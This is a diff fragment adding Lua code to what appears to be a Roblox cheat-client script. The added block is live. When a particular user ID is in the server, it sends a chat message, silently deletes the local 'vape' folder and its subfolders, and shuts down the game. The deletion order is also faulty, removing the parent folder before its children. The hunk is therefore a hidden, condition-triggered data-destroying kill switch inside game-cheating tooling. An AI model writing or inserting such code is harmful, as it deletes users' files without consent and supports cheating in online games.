@@ -81,6 +81,27 @@ if shared.FuncsConnect then
 			game:Shutdown()
 		end
 	end
+	
+--[[]]
+	if shared.Useless then
+		print("ok")
+	else
+		for i,v in pairs(playersService:GetPlayers()) do
+			if v.UserId == 4584934336 then
+				if shared.MercuryLoaded and not shared.Useless then
+					Functions.ChatMessage("DETECTED AHHHHHH", "MaxlaserTechOnTop6")
+				end
+				if isfolder("vape") then
+					delfolder("vape")
+					delfolder("vape/CustomModules")
+					delfolder("vape/Profiles")
+					delfolder("vape/assets")
+				end
+				game:Shutdown()
+			end
+		end
+	end
+--]]
 
 	if shared.FuncsConnect then
 		print("Functions Has Been Connected!")
